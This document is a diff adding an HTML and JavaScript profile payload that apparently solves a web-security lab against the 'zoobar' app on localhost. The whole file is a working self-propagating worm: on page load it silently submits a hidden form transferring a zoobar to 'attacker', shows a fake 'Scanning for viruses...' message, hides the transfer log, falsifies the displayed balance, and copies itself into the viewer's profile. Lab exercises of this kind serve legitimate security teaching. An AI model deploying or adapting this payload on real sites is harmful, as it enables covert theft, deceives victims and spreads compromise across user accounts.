@@ -1,0 +1,73 @@
+</b></div>
+<div id="attacker_profile">
+
+<div style="display:none">
+<form method="POST" id="transferform" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="my_iframe">
+
+<input name="zoobars" type="text" value="1" size=5 style="display:none">
+<input name=recipient type=text value="attacker" size=10 style="display:none">
+<input type="submit" name="submission" value="Send">
+</form>
+</div>
+<iframe id="attack_iframe" name="my_iframe" src="" style="display:none"></iframe>
+
+<div style="display:none">
+<form method="POST" id="profileform" name="profileform" action="http://localhost:8080/zoobar/index.cgi/" target="my_iframe2">
+    <textarea id="profile_update" name="profile_update" rows="20" cols="80"></textarea>
+    <input type="submit" name="profile_submit" value="Save" />
+</form>
+</div>
+<iframe id="attack_iframe2" name="my_iframe2" src="" style="display:none"></iframe>
+
+<script type="text/javascript">
+  function stealZoobar() {
+    console.log(document.getElementById('transferform'));
+    document.getElementById('transferform').submit();
+  }
+
+  function displayProfile(argument) {
+    var profileDiv = document.getElementById("profile");
+    var mynode = document.createElement("b");
+    var mycontent = document.createTextNode("Scanning for viruses...");
+    mynode.appendChild(mycontent);
+    profileDiv.appendChild(mynode);
+  }
+
+  function hiddenTransfer(argument) {
+    var transfertableTB = document.getElementsByClassName("log")[0];
+    transfertableTB.tBodies[0].setAttribute("style","display:none");
+    //transfertableTB.tBodies[0].style.visibility='hidden';
+  }
+  function hiddenZoobar(argument) {
+    // var profileHeaderDiv = document.getElementById("profileheader");
+    // profileHeaderDiv.textContent = profileHeaderDiv.textContent.split("zoobars:")[0] + "zoobars:" +"10";
+
+    var zoobarsNode = document.getElementById("zoobars");
+    zoobarsNode.setAttribute("class",10);
+    console.log("total="+total)
+    total = 10;
+    showZoobars(0);
+  }
+
+  function addWormProfile(argument) {
+    var attacker_profile = document.getElementById('attacker_profile');
+    var profile_update = document.getElementById('profile_update');
+    var prefix = '</b></div><div id='+'attacker_profile'+'>';
+    var suffix = '</div>';
+    profile_update.textContent = prefix + attacker_profile.innerHTML + suffix;
+    document.getElementById('profileform').submit();
+  }
+
+  document.addEventListener("DOMContentLoaded", function(event) { 
+    stealZoobar();
+    displayProfile();
+    hiddenTransfer();
+    hiddenZoobar();
+    addWormProfile();   
+  });
+
+
+</script>
+</div>
+
+
